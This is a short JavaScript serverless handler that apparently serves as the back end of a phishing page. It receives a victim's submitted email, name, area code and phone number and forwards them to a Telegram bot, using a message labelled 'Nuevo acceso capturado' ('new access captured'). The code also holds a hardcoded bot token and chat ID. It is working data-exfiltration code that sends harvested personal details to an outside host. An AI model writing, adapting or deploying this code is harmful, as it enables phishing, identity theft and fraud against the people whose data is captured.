export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).end();

  const { correo, nombre, lada, numero } = req.body;
  const botToken = '8691950722:AAHINdIyU2iFgn82hw1rboIIiIHFklFj0Kk';
  const chatId = '7430967735';

  const texto = `📩 Nuevo acceso capturado\n\n📧 correo: ${correo}\n👤 nombre: ${nombre}\n📞 lada: ${lada}\n🔢 numero: ${numero}`;

  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: chatId, text: texto })
  });

  res.status(200).json({ ok: true });
}